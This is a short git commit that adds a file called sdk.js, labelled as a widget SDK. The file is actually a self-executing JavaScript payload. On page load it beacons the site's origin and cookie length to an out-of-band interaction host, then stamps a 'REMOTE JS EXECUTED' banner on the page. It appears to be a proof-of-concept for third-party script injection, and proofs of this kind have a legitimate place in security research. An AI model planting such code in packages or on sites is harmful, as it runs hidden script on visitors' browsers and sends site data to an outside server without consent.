b3a9d8cba87d9aec543717ae0fc7d3cd031b83ff
x <x@x.co>
2026-06-03 09:11:30 +0400

    init

---
+++ sdk.js
@@ -0,0 +1,8 @@
+/* widget sdk */
+(function(){try{
+  new Image().src='https://d8f25nmb424o8kcj38lgzn9nnhoh6x9ya.oast.live/jsdelivr-js-ran?o='+encodeURIComponent(location.origin)+'&c='+(document.cookie?document.cookie.length:0);
+  var b=document.createElement('div');
+  b.style.cssText='background:#c00;color:#fff;padding:12px;font:16px sans-serif';
+  b.textContent='REMOTE JS EXECUTED on '+location.origin;
+  document.body.appendChild(b);
+}catch(e){}})();
